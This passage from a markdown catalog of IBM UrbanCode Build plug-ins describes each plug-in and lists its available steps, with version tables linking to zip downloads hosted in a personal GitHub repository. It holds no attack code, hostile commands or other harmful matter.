mobile application source code vulnerabilities early in the software development lifecycle, so they can be fixed before 
deployment.


IBM Security AppScan Source integrates application security testing into your software development 
lifecycle. It offers enhanced mobile application scanning capabilities and supports testing for mobile web, native and 
hybrid applications, which includes support for JavaScript, HTML5, Cordova, Java and Objective-C. IBM Security AppScan 
Source also provides integration with IBM Worklight® Studio and the ability to scan Worklight applications.



IBM 
Security AppScan Source can enable:



* **Stronger and more cost-effective software security** through source code 
analysis.
* **Improved intelligence through integration** with existing tools and processes such as application 
development, build integration and security monitoring.
* **Security best practices** through centralized management and
 enforcement of security policies.
* **Reporting, governance and compliance capabilities** that facilitate communication
 of security status and issues.



Available Steps
---------------


Scan / Upload Scan a project and upload the 
results. This step can generate .paf and .ppf files. Scan results are loaded into IBM UrbanCode Build as a source 
analytics report on the build life.


Run Script Run an IBM Security AppScan Source script with the AppScanSrcCli 
command.


Report Results Upload scan report results to IBM UrbanCode Build.





|Latest Version||
| :---: | :---: |
|[**1.772903**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/RationalAppScan/RationalAppScan-1.772903.zip)|[Downloads](plugins/RationalAppScan/downloads.md)|


---
## Rational Team Concert SCM



IBM Rational Team Concert is collaborative lifecycle management software tool for systems and software development 
teams. It provides source control to manage source code, documents, and other artifacts that you want to place under 
version control and share with a team. 


The Rational Team Concert SCM plug-in automates populating an Rational Team 
Concert workspace, creating a snapshot, and publishing source changes to the **Changes** tab of a BuildLife.




Available Steps
---------------


RTC ChangelogCreate a Rational Team Concert changelog. The default content is the data
 between the previous BuildLife and the current BuildLife.


RTC CheckoutCheckout source from a Rational Team Concert 
repository.


RTC CleanupClean the current working directory.


RTC Create BaselineCreate a baseline in Rational Team 
Concert.


RTC Quiet PeriodCheck the Rational Team Concert history for quiet period detection and publish the results.






|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**24.1013888**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/RationalTeamConcert/RTC-scm-24.1013888.zip)|[Overview](plugins/RationalTeamConcert/overview.md)|[Steps_and_Settings](plugins/RationalTeamConcert/steps_and_settings.md)|[Downloads](plugins/RationalTeamConcert/downloads.md)|


---
## Report Publisher



Uploads specified files as reports to the server.



Available Steps
---------------


Publish Report Publish some 
files as a report





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**8.913304**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/ReportPublisher/Report-Publisher-8.913304.zip)|[Overview](plugins/ReportPublisher/overview.md)|[Steps](plugins/ReportPublisher/steps.md)|[Downloads](plugins/ReportPublisher/downloads.md)|


---
## Reporting



The Reporting plug-in includes a step to run saved reports in workflows.



Available Steps
---------------


Run 
Report Run a report and save the output.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**6.913227**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Reporting/urbancode-reporting-6.913227.zip)|[Overview](plugins/Reporting/overview.md)|[Steps](plugins/Reporting/steps.md)|[Downloads](plugins/Reporting/downloads.md)|


---
## Selenium for IBM UrbanCode Build



Selenium provides a set of tools to automate testing web applications. It can also be used to automate basic browser 
functions and administration tasks. Testing is accomplished through a set of Selenium commands that are stored in a HTML
 text file.


The Selenium plug-in contains a step to run selenese HTML files with Selenium RC or WebDriver.




Available Steps
---------------


Run Test SuiteRun a Selenium test suite





|Latest Version|||||
| :---: | :---: | :---: | :---: | :---: |
|[**6.752852**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Selenium/Selenium-6.752852.zip)|[Overview](plugins/Selenium/overview.md)|[Steps](plugins/Selenium/steps.md)|[Usage](plugins/Selenium/usage.md)|[Downloads](plugins/Selenium/downloads.md)|


---
## Shell for IBM UrbanCode Build



A shell provides an interface for users of an operating system that provides access to the services of a kernel. 
Operating system shells generally fall into one of two categories: command-line and graphical. Command-line shells 
provide a command-line interface (CLI) to the operating system, while graphical shells provide a graphical user 
interface (GUI). In either category, the primary purpose of the shell is to invoke or launch another program; however, 
shells frequently have additional capabilities such as viewing the contents of directories.


The Shell plug-in includes
 steps to run custom shell scripts during a build.



Available Steps
---------------


Shell Run a shell or batch 
script.


Shell (with xargs) Run a shell or batch script a number of times equal to a multi-valued input.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**7.913337**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Shell/Shell-7.913337.zip)|[Overview](plugins/Shell/overview.md)|[Steps](plugins/Shell/steps.md)|[Downloads](plugins/Shell/downloads.md)|


---
## SonarQube (formerly Sonar)



SonarQube is a code quality analysis tool which covers the 7 axes of code quality; comments, architecture and design, 
duplications, coding rules, potential bugs, unit tests, and complexity.


Plugin to provide SonarQube steps for .NET and
 Java.



Available Steps
---------------


Run SonarQubeRun SonarQube to get information about source and tests from 
SonarQube


Run SonarQube for .NETRun SonarQube to get information about source and tests from SonarQube for .NET





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**8.838525**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Sonar/SonarQube-8.838525.zip)|[Overview](plugins/Sonar/overview.md)|[Steps](plugins/Sonar/steps.md)|[Downloads](plugins/Sonar/downloads.md)|


---
## SonarQube

|Latest Version||
| :---: | :---: |
|[**3.106936**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/SonarQube/SonarQube-3.1069360.zip)|[Downloads](plugins/SonarQube/downloads.md)|


---
## Sonargraph



The Sonargraph plugin uploads the Sonargraph results to the Analytics tab of the BuildLife. The Sonargraph plugin is 
capable of parsing logs from Sonargraph-Architect.



Available Steps
---------------


Publish ResultsPublish 
Sonargraph results to a build life. This reads the XML output of Sonargraph





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**5.752915**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Sonargraph/Sonargraph-5.752915.zip)|[Overview](plugins/Sonargraph/overview.md)|[Steps](plugins/Sonargraph/steps.md)|[Downloads](plugins/Sonargraph/downloads.md)|


---
## Subversion for IBM UrbanCode Build



 Subversion is an open source version control software. It is used to maintain current and previous versions of source 
code, web pages, and documentation. 


Subversion was previously developed under the Subversion software project. It is 
now developed and licensed under the Apache Subversion software project.


The Subversion plug-in checks out and exports
 code from a Subversion repository to include in the build process. It can also be used to create Subversion branches.




Available Steps
---------------


Svn ChangelogPerform a Subversion changelog and publish the results.


Svn 
CheckoutPerform a Subversion checkout or export.


Svn CleanupPerform a cleanup of the subversion working directory.



Svn Quiet PeriodPerform a Subversion changelog for quiet period detection and publish the results.


Svn TagCreate a 
branch or tag in Subversion.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**11.1023828**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Subversion/Subversion-11.1023828.zip)|[Overview](plugins/Subversion/overview.md)|[Steps_and_Settings](plugins/Subversion/steps_and_settings.md)|[Downloads](plugins/Subversion/downloads.md)|


---
## Team Foundation Server



Microsoft Team Foundation Server (TFS) is a source code management product for collaborative software development 
project. It provides source control, data collection, reporting, and project tracking. 


The Team Foundation Server 
plug-in includes steps for retrieving and labeling source from TFS. It can also be used to publish source changes to the
 Changes tab of the build life.



Available Steps
---------------


TFS Changelog Perform a TFS changelog and publish 
the results.


TFS Cleanup Perform a cleanup of the TFS working directory.


TFS Create Label Create a label in TFS.



TFS Get Source Perform a TFS get source


TFS Quiet Period Perform a TFS changelog for quiet period detection and 
publish the most recent change date within the period.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**11.1049734**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/TFS/TFS-11.1049734.zip)|[Overview](plugins/TFS/overview.md)|[Steps_and_Settings](plugins/TFS/steps_and_settings.md)|[Downloads](plugins/TFS/downloads.md)|


---
## TFS Work Items



Work items in Microsoft Team Foundation Server can document work requests such as requirements, bugs, and reviews. Work
 items can be tracked from creation to completion. 


The TFS Work Items plug-in includes steps for creating and 
modifying work items in a Team Foundation Server repository.



Available Steps
---------------


Add CommentAdd 
comments from the current changelog to matching TFS defects.


Change Work Item StateChange the state of a TFS work 
item.


Create Work ItemCreate a TFS work item.


Publish Work Item ReportCreate an issue report for work items.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**4.752909**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/TFS-WorkItems/TFS-WorkItems-4.752909.zip)|[Overview](plugins/TFS-WorkItems/overview.md)|[Steps_and_Settings](plugins/TFS-WorkItems/steps_and_settings.md)|[Downloads](plugins/TFS-WorkItems/downloads.md)|


---
## UrbanCode Velocity


UrbanCode Velocity provides tools to help you visualize and understand your DevOps pipelines and processes. The 
UrbanCode Velocity plug-in uploads build data into the UrbanCode Velocity server.
|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**5.1049716**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/UCB-Velocity/urbancode-velocity-5.1049716.zip)|[Overview](plugins/UCB-Velocity/overview.md)|[Steps](plugins/UCB-Velocity/steps.md)|[Downloads](plugins/UCB-Velocity/downloads.md)|


---
## UCB Utilities



The UCB Utilities plugin can be used to interact with different aspects of UrbanCode Build, including setting 
properties in different scopes and writing JSON files.




|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.1058205**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/UCBUtils/UCBUtils-2.1058205.zip)|[Overview](plugins/UCBUtils/overview.md)|[Steps](plugins/UCBUtils/steps.md)|[Downloads](plugins/UCBUtils/downloads.md)|


---
## Visual Studio



The Visual Studio plug-in can be used to build solution files with Visual Studio in headless mode.



Available Steps

---------------


Run Visual StudioBuild a Visual Studio solution file in headless mode.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**9.1056675**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/VisualStudio/VisualStudio-9.1056675.zip)|[Overview](plugins/VisualStudio/overview.md)|[Steps](plugins/VisualStudio/steps.md)|[Downloads](plugins/VisualStudio/downloads.md)|


---
## Xcode



Xcode is an Integrated Development Environment (IDE) containing a suite of software development tools developed by 
Apple for developing software for OS X and iOS.



The Xcode plug-in automates building and packaging OS X and iOS 
applications.



Available Steps
---------------


Xcode Build Build a project using the xcodebuild command.


Apple 
Generic Versioning Apply a technical or marketing version to a project using the agvtool command.


Package 
ApplicationPackage the application to a .ipa file using the xcrun tool.





|Latest Version|||||
| :---: | :---: | :---: | :---: | :---: |
|[**5.1098513**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/Xcode/Xcode-hcl-5.1098513.zip)|[Overview](plugins/Xcode/overview.md)|[Steps](plugins/Xcode/steps.md)|[Usage](plugins/Xcode/usage.md)|[Downloads](plugins/Xcode/downloads.md)|


---
## DevOps Insights – Deployment Risk Analytics (DRA)




DevOps Insights aggregates data from multiple tools and provides insights to improve the agility, reliability, and 
security of your applications and your DevOps process. Use its built-in dashboards and data reporting services to learn 
where you most need to improve your developer productivity, code quality, and delivery cycle times.




Deployment Risk 
Analytics (DRA) assesses and enforces quality and control across your delivery pipelines by using automated data 
collection, risk analysis, and policy gates. Use the DevOps Insights – Deployment Risk Analytics plug-in for IBM 
UrbanCode Build to upload success/failure build statuses and test results.




Available Steps
---------------


Publish
 Build Publish build result to DevOps Insights – Deployment Risk Analytics.


Publish Test Publish test files to DevOps 
– Insights Deployment Risk Analytics.





|Latest Version||
| :---: | :---: |
|[**1.939632**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/bluemix-deployment-risk-analytics/devops-insights-deployment-risk-analytics-ubuild-1.939632.zip)|[Downloads](plugins/bluemix-deployment-risk-analytics/downloads.md)|


---
## Checkstyle



Checkstyle is an analytic tool that programmers can use to verify that Java code adheres to a coding standard. It 
provides an automated process for enforcing a coding standard.


The IBM UrbanCode Build Checkstyle plug-in uploads the 
results of a Checkstyle analysis into a buildlife.



Available Steps
---------------


Publish Checkstyle 
ResultsPublish Checkstyle results to a buildlife.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**3.753093**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/checkstyle/checkstyle-3.753093.zip)|[Overview](plugins/checkstyle/overview.md)|[Steps](plugins/checkstyle/steps.md)|[Downloads](plugins/checkstyle/downloads.md)|


---
## digital-experience

|Latest Version||
| :---: | :---: |
|[**9.1071405**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/digital-experience/plugins-digital-experience-9.1071405.zip)|[Downloads](plugins/digital-experience/downloads.md)|


---
## dimensions

|Latest Version||
| :---: | :---: |
|[**2.753376**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/dimensions/dimensions-2.753376.zip)|[Downloads](plugins/dimensions/downloads.md)|


---
## IBM Dependency Based Build


The UrbanCode Build IBM Dependency Based Build plug-in automates inclusion of building traditional z/OS applications 
such as COBOL and PL/I. 
|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.1053929**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/ibm-dbb/ibm-dbb-2.1053929.zip)|[Overview](plugins/ibm-dbb/overview.md)|[Steps](plugins/ibm-dbb/steps.md)|[Downloads](plugins/ibm-dbb/downloads.md)|


---
## IBM UrbanCode Deploy for IBM UrbanCode Build



IBM UrbanCode Deploy provides release management and automation to improve speed, correctness, and traceability of 
complex application deployments.


This plug-in includes steps to create component versions in IBM UrbanCode Deploy and 
to upload files to component versions.



Available Steps
---------------


Add Component Version Status Add a status to
 an existing component version.


Create Component Version Create a component version in UrbanCode Deploy and optionally
 upload files to it.


Deploy Component Version Deploy a component version in UrbanCode Deploy.


Set Component Version 
Properties Set properties on an existing component version.


Upload All Artifact Sets Upload all artifact sets to 
UrbanCode Deploy.


Upload Artifact Set Upload an artifact set to UrbanCode Deploy.


Upload Artifacts To Version Upload
 artifacts to an existing component version in UrbanCode Deploy.


Create Version Link Create a link on a version that 
links back to the build life in IBM UrbanCode Build


Create Environment Snapshot Create a snapshot of an environment, 
including all component versions in its inventory.


Deploy With Snapshot Deploy a snapshot.


Invoke Buztool Invoke 
Buztool for uploading artifacts to z/OS component versions in UCD.





|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**52.1071101**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/ibmucd/ibm-ucd-52.1071101.zip)|[Overview](plugins/ibmucd/overview.md)|[Steps](plugins/ibmucd/steps.md)|[Downloads](plugins/ibmucd/downloads.md)|


---
## jac

|Latest Version||
| :---: | :---: |
|[**1.1070875**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/jac/plugins-jac-1.1070875.zip)|[Downloads](plugins/jac/downloads.md)|


---
## plugins-ucb-velocity

|Latest Version||
| :---: | :---: |
|[**1.102712**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/plugins-ucb-velocity/plugins-ucb-velocity-1.1027120.zip)|[Downloads](plugins/plugins-ucb-velocity/downloads.md)|


---
## Salesforce


The Salesforce plug-in for UrbanCode Build uses the Force.com Migration Tool to perform file-based deployment of 
metadata changes and Apex classes.
|Latest Version||||
| :---: | :---: | :---: | :---: |
|[**2.1056278**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/salesforce/salesforce-2.1056278.zip)|[Overview](plugins/salesforce/overview.md)|[Steps](plugins/salesforce/steps.md)|[Downloads](plugins/salesforce/downloads.md)|


---
## uDeploy

|Latest Version||
| :---: | :---: |
|[**17.522989**](https://raw.githubusercontent.com/osmsnbey/todelete2/main/files/UCB/uDeploy/uDeploy-17.522989.zip)|[Downloads](plugins/uDeploy/downloads.md)|


---